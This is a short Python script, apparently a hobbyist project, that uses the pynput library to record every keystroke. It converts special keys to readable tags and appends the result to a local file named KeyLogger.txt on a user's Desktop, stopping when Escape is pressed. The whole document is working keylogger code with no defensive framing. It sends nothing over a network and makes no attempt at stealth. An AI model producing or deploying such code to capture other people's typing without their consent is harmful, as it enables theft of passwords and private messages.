from pynput.keyboard import Key, Listener

# Define the path to the log file
log_file = r"C:\Users\abroh\OneDrive\Desktop\KeyLogger.txt"


def write_to_log(key):
    # Convert the key to a string
    try:
        key = str(key).replace("'", "")  # Remove single quotes around characters
    except:
        key = str(key)

    # Handle special keys
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.backspace":
        key = "[BACKSPACE]"
    elif "Key" in key:
        key = f"[{key}]"

    # Write the key press to the log file
    with open(log_file, "a") as f:
        f.write(key)


# Function called when a key is pressed
def on_press(key):
    write_to_log(key)


# Function called when a key is released
def on_release(key):
    # Stop listener if Escape key is pressed
    if key == Key.esc:
        return False


# Start listening for key presses and releases
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
